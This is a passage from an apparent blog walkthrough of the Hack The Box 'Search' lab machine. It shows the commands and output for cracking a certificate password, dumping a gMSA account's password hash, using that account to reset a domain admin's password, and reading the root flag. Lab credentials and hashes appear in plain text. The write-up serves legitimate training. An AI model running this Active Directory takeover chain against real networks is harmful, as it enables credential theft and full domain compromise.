<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># /root/p12tool/p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt</span></span><br><span class="line"></span><br><span class="line">██████╗  ██╗██████╗ ████████╗ ██████╗  ██████╗ ██╗     </span><br><span class="line">██╔══██╗███║╚════██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     </span><br><span class="line">██████╔╝╚██║ █████╔╝   ██║   ██║   ██║██║   ██║██║     </span><br><span class="line">██╔═══╝  ██║██╔═══╝    ██║   ██║   ██║██║   ██║██║     </span><br><span class="line">██║      ██║███████╗   ██║   ╚██████╔╝╚██████╔╝███████╗</span><br><span class="line">╚═╝      ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝</span><br><span class="line"></span><br><span class="line">Version: 1.0 (n/a) - 01/07/22 - Evi1cg</span><br><span class="line"></span><br><span class="line">2022/01/07 15:42:12 -&gt;  [*] Brute forcing...</span><br><span class="line">2022/01/07 15:42:12 -&gt;  [*] Start thread num 100</span><br><span class="line">2022/01/07 15:42:12 -&gt; [+] Password found ==&gt; misspissy</span><br><span class="line">2022/01/07 15:42:12 -&gt; [*] Successfully cracked password after 5484391 attempts!</span><br></pre></td></tr></table></figure>

<p>If you are on VM then it’d take much more time. Now we have the password for the certificate. Let’s add it in our browser.</p>
<p>There’s a specific endpoint which you can access with this certificate.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://search.htb/staff/en-US/logon.aspx</span><br></pre></td></tr></table></figure>

<p>Now we need to input the credentials of ‘Sierra’ user and access PowerShell Console.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sierra.Frye</span><br><span class="line">$<span class="variable">$49</span>=wide=STRAIGHT=jordan=28$<span class="variable">$18</span>	</span><br><span class="line">research.search.htb</span><br></pre></td></tr></table></figure>

<p>After login we can run Powershell commands.</p>
<p>Let’s go back to bloodhound and look for path from owned principle to domain admin.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search6.jpg"></li>
</ul>
<p>As we are member of ITSEC, we can read GMSA password.</p>
<p><span class="exturl" data-url="bWFpbHRvOiYjeDQyOyYjeDQ5OyYjeDUyOyYjeDJkOyYjNjU7JiN4NDQ7JiN4NDY7JiN4NTM7JiN4MmQ7JiN4NDc7JiN4NGQ7JiN4NTM7JiM2NTsmIzY0OyYjODM7JiN4NDU7JiN4NDE7JiM4MjsmIzY3OyYjNzI7JiM0NjsmI3g0ODsmI3g1NDsmIzY2Ow==">&#x42;&#x49;&#x52;&#x2d;&#65;&#x44;&#x46;&#x53;&#x2d;&#x47;&#x4d;&#x53;&#65;&#64;&#83;&#x45;&#x41;&#82;&#67;&#72;&#46;&#x48;&#x54;&#66;<i class="fa fa-external-link-alt"></i></span> is a Group Managed Service Account. The group <span class="exturl" data-url="bWFpbHRvOiYjNzM7JiN4NTQ7JiN4NTM7JiN4NDU7JiN4NDM7JiN4NDA7JiN4NTM7JiM2OTsmI3g0MTsmI3g1MjsmI3g0MzsmI3g0ODsmI3gyZTsmIzcyOyYjeDU0OyYjeDQyOw==">&#73;&#x54;&#x53;&#x45;&#x43;&#x40;&#x53;&#69;&#x41;&#x52;&#x43;&#x48;&#x2e;&#72;&#x54;&#x42;<i class="fa fa-external-link-alt"></i></span> can retrieve the password for the GMSA <span class="exturl" data-url="bWFpbHRvOiYjeDQyOyYjeDQ5OyYjeDUyOyYjeDJkOyYjNjU7JiM2ODsmI3g0NjsmIzgzOyYjNDU7JiM3MTsmIzc3OyYjeDUzOyYjeDQxOyYjeDQwOyYjODM7JiM2OTsmI3g0MTsmIzgyOyYjeDQzOyYjeDQ4OyYjeDJlOyYjNzI7JiM4NDsmIzY2Ow==">&#x42;&#x49;&#x52;&#x2d;&#65;&#68;&#x46;&#83;&#45;&#71;&#77;&#x53;&#x41;&#x40;&#83;&#69;&#x41;&#82;&#x43;&#x48;&#x2e;&#72;&#84;&#66;<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># python3 /root/gMSADumper-main/gMSADumper.py -d search.htb -u &#x27;Sierra.Frye&#x27; -p &#x27;$$49=wide=STRAIGHT=jordan=28$$18&#x27;</span></span><br><span class="line">BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f</span><br></pre></td></tr></table></figure>

<p>gMSAs use 240-byte, randomly generated complex passwords. So, it’s hard to crack.</p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL2Jsb2IvbWFzdGVyL01ldGhvZG9sb2d5JTIwYW5kJTIwUmVzb3VyY2VzL0FjdGl2ZSUyMERpcmVjdG9yeSUyMEF0dGFjay5tZCNyZWFkaW5nLWdtc2EtcGFzc3dvcmQ=">Reading GMSA Password<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXBoaW5nYWRtaW4uY29tL1Bhc3N3b3JkbGVzc1Bvd2VyU2hlbGwv">Passwordless PowerShell - How to use gMSAs In Your Scripts<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>GMSA Attributes in the Active Directory</p>
</li>
</ul>
<p>msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) - stores the security principals that can access the GMSA password.<br>msds-ManagedPassword - This attribute contains a BLOB with password information for group-managed service accounts.<br>msDS-ManagedPasswordId - This constructed attribute contains the key identifier for the current managed password data for a group MSA.<br>msDS-ManagedPasswordInterval - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.</p>
<p>Based on these both blogs, we can run commands as BIR-ADFS-GMSA to set an environment to access domain admin</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="string">&#x27;BIR-ADFS-GMSA$&#x27;</span></span><br><span class="line"><span class="variable">$gmsa</span> = Get-ADServiceAccount -Identity <span class="variable">$user</span> -Properties <span class="string">&#x27;msDS-ManagedPassword&#x27;</span></span><br><span class="line"><span class="variable">$blob</span> = <span class="variable">$gmsa</span>.<span class="string">&#x27;msDS-ManagedPassword&#x27;</span></span><br><span class="line"><span class="variable">$mp</span> = ConvertFrom-ADManagedPasswordBlob <span class="variable">$blob</span></span><br><span class="line"><span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential <span class="variable">$user</span>, <span class="variable">$mp</span>.SecureCurrentPassword</span><br></pre></td></tr></table></figure>

<p>With these above we are setting up the GMSA password to be used and runas ‘BIR-ADFS-GMSA$’ user.</p>
<p>Everything is set, now we need to invoke commands to run any type of script&#x2F;command.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName localhost -Credential <span class="variable">$cred</span> -ScriptBlock &#123;<span class="built_in">whoami</span>&#125;</span><br></pre></td></tr></table></figure>

<p>For that we will use above command to know which user access we have right now.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search7.jpg"></li>
</ul>
<p>As you can see ‘whoami’ result is showing that we are ‘BIR-ADFS-GMSA$’ user, not ‘Sierra’. Let’s look into Bloodhound one more time.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search8.jpg"></li>
</ul>
<p>Let’s look into help of ‘Generic all’.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search9.jpg"></li>
</ul>
<p>As you can see ‘Generic All’ privileges simply means full control over ‘Tristan’ user, who is also a domain admin. Let’s change the domain admin password.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Sierra.Frye\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName localhost -Credential <span class="variable">$cred</span> -ScriptBlock &#123;net user Tristan.Davies qwerty1234 /domain&#125;</span><br><span class="line"></span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>

<p>Now we can access admin directory to read the root flag.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># smbclient //search.htb/C$ -U Tristan.Davies</span></span><br><span class="line">Enter WORKGROUP\Tristan.Davies<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; cd \Users\Administrator\Desktop</span></span><br><span class="line"><span class="string">smb: \Users\Administrator\Desktop\&gt; ls</span></span><br><span class="line"><span class="string">  .                                 DRc        0  Mon Nov 22 15:21:49 2021</span></span><br><span class="line"><span class="string">  ..                                DRc        0  Mon Nov 22 15:21:49 2021</span></span><br><span class="line"><span class="string">  desktop.ini                       AHS      282  Mon Nov 22 15:21:49 2021</span></span><br><span class="line"><span class="string">  root.txt                          ARc       34  Fri Jan  7 11:13:49 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                3246079 blocks of size 4096. 461189 blocks available</span></span><br><span class="line"><span class="string">smb: \Users\Administrator\Desktop\&gt; get root.txt</span></span><br><span class="line"><span class="string">getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/search]</span></span><br><span class="line"><span class="string">└─# cat root.txt        </span></span><br><span class="line"><span class="string">e66ca102d9ee6b0894fffa9a65b13e18</span></span><br></pre></td></tr></table></figure>

<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
<li>kerbrute enumerate valid usernames</li>
<li>crackmapexec password spray</li>
<li>bloodhound information gathering</li>
<li>Kerberoasting without SPNs</li>
<li>hashcat crack service account’s hash</li>
<li>XLS file remove password protection</li>
<li>browser digital certificate password crack using p12tool</li>
<li>using gMSADumper read GMSA password</li>
<li>change the domain admin password to privesc</li>
</ul>
<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2022/01/08/search/" title="Hack-The-Box-walkthrough[search]">https://fdlucifer.github.io/2022/01/08/search/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/01/05/decrypt-winrm-traffic/" rel="prev" title="从pcap包中解密Winrm流量">
                  <i class="fa fa-chevron-left"></i> 从pcap包中解密Winrm流量
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/01/12/pandora/" rel="next" title="Hack-The-Box-walkthrough[pandora]">
                  Hack-The-Box-walkthrough[pandora] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">648k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">39:15</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
